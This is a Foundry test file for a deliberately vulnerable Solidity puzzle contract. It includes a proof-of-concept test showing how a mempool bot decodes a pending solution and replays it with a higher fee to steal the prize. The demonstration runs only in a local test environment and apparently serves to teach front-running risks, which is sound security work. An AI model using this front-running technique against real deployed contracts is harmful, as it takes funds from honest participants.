// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {VulnerablePuzzle} from "../../src/vulnerable/VulnerablePuzzle.sol";

contract FrontRunTest is Test {
    VulnerablePuzzle puzzle;
    address hedi = makeAddr("hedi");
    address hedisarrek = makeAddr("hedisarrek");
    string constant ANSWER = "ethershield";

    function setUp() public {
        puzzle = new VulnerablePuzzle{value: 10 ether}(
            keccak256(abi.encodePacked(ANSWER))
        );
    }

    // What a mempool bot does: decode the arguments of a pending transaction
    function readAnswer(
        bytes calldata txData
    ) external pure returns (string memory) {
        return abi.decode(txData[4:], (string)); // skip the 4-byte function selector
    }

    function test_HonestSolve() public {
        vm.prank(hedi);
        puzzle.solve(ANSWER);
        assertEq(hedi.balance, 10 ether);
    }

    function test_WrongAnswerReverts() public {
        vm.prank(hedi);
        vm.expectRevert("wrong answer");
        puzzle.solve("wrong");
    }

    function test_Exploit_FrontRunStealsPrize() public {
        // 1. hedi broadcasts his solution: these bytes are now public in the mempool
        bytes memory hediTx = abi.encodeCall(VulnerablePuzzle.solve, (ANSWER));

        // 2. hedisarrek's bot reads the answer from hedi's pending transaction
        console.log("answer read from mempool:", this.readAnswer(hediTx));

        // 3. the bot sends an exact copy with a higher fee, so it runs first
        vm.prank(hedisarrek);
        (bool ok, ) = address(puzzle).call(hediTx);
        assertTrue(ok);

        // 4. hedi's original transaction runs second
        vm.prank(hedi);
        vm.expectRevert("already solved");
        puzzle.solve(ANSWER);

        assertEq(puzzle.winner(), hedisarrek);
        assertEq(hedisarrek.balance, 10 ether);
        assertEq(hedi.balance, 0);
    }
}
